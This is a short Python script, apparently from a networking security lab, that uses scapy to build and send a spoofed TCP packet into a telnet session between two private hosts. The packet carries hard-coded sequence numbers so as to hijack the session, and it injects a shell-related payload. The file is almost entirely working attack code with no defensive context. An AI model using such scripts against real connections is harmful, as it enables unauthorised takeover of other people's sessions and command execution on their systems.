# -*- coding: utf-8 -*-
"""
Created on Fri Apr 16 20:11:44 2021

@author: mohit
"""

import sys
from scapy.all import *

print ("Session Hijacking Packet !!!!!!!!")
IPLayer = IP (src="192.168.1.111", dst="192.168.1.114")
TCPLayer = TCP (sport=34610, dport=23, flags="A", seq=996242368 , ack=3803577593)
Data = "-e/bin/bash"
pkt = IPLayer/TCPLayer/Data
ls(pkt)
send(pkt,verbose=0)
